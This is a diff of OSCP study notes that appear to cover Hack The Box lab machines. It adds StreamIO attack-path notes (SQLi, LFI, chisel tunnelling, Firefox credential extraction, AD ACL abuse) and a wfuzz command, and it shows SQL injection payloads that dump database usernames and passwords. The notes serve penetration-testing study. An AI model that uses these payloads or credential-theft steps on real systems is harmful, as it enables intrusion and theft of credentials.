@@ -93,7 +93,7 @@ https://github.com/tedchen0001/OSCP-Notes/blob/master/AD.md
 | SecNotes | CSRF reset password link, smb, IIS php | WinPEAS Linux shells/distributions ||
 | Servmon | FTP, NVMS LFI, SSH | NSClient, *SSH tunnel (localhost services) ||
 | Silo | Oracle (default port 1521), CVE-2012-1675, ODAT, brute-force | Oracle, SYSTEM Privilege ||
-| StreamIO | subdomain, SQLi |||
+| StreamIO | subdomain, SQLi, wfuzz(parameter), LFI(php://filter), page uses eval | [forwarding service](https://github.com/jpillora/chisel), SQL Server 1433, [firefox credentials](https://github.com/lclevy/firepwd), <br>bloodhound, Add-DomainObjectAcl(add member to CORE STAFF) ||
 | Support | disassemble(.Net), LDAP, user information | DACL abuse, GenericAll | :white_check_mark: |
 | Worker | SVN(default port 3690), revision, Azure DevOps,  new branch, <br>additional drives, evil-winrm | Azure DevOps, PowerShell task ||
 
@@ -461,4 +461,10 @@ Used in ```StreamIO```
 ' UNION SELECT 1, (SELECT STRING_AGG(COLUMN_NAME, ',') FROM STREAMIO.INFORMATION_SCHEMA.COLUMNS), 3, '4', '5', '6';--
 /* get the usernames and passwords */
 ' UNION SELECT 1, (SELECT STRING_AGG(username, ',') + STRING_AGG(password, ',') FROM STREAMIO.dbo.users), 3, '4', '5', '6';--
+```
+
+find parameter
+
+```
+wfuzz -H 'Cookie: PHPSESSID=<PHPSESSID>' -u https://streamio.htb/admin/?FUZZ= -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hw <value>
 ```
